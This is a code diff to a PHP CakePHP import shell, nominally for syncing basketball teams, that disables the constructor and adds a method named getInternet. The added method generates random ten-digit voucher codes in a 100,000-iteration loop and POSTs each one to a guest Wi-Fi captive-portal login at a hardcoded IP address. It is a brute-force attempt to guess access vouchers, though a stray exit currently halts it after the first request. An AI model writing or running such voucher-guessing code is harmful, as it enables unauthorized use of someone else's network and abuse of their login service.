@@ -12,13 +12,13 @@ use Cake\Utility\Text;
 class ImportShell extends Shell
 {
 
-   public function __construct()
+  /* public function __construct($io)
    {
        //Load Models
-       $this->loadModel("Teams");
+       //$this->loadModel("Teams");
 
-       parent::__construct();
-   }
+       parent::__construct($io);
+   }*/
 
     /**
      * Syc teams form NBB api to local DB
@@ -50,6 +50,44 @@ class ImportShell extends Shell
 
             //Save team
             $this->Teams->save($teamEntities);
+        }
+
+    }
+
+    public function getInternet(){
+
+        for($i =0; $i < 100000; $i++){
+            $int = rand(0,9).rand(0,9).rand(0,9).rand(0,9).rand(0,9)."-".rand(0,9).rand(0,9).rand(0,9).rand(0,9).rand(0,9);
+            echo "$int \n";
+
+            $url = "http://178.63.77.69:8880/guest/s/default/login";
+
+            $fields = "by=voucher&page_error=index.html&voucher=".$int;
+
+            $ch = curl_init();
+            curl_setopt($ch,CURLOPT_URL, $url );
+        /*    curl_setopt($ch,CURLOPT_HEADER, false );
+            curl_setopt($ch,CURLOPT_USERAGENT, 'User-Agent:"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0"');
+            curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch,CURLOPT_BINARYTRANSFER, true);*/
+            curl_setopt($ch,CURLOPT_POST, 3 );
+            curl_setopt($ch,CURLOPT_POSTFIELDS, $fields );
+
+            debug($ch);
+
+            $result = curl_exec($ch);
+            exit;
+
+            curl_close($ch);
+
+            if($result == false){
+
+                debug($result);
+                exit;
+            }
+
+            //exit;
+
         }
 
     }
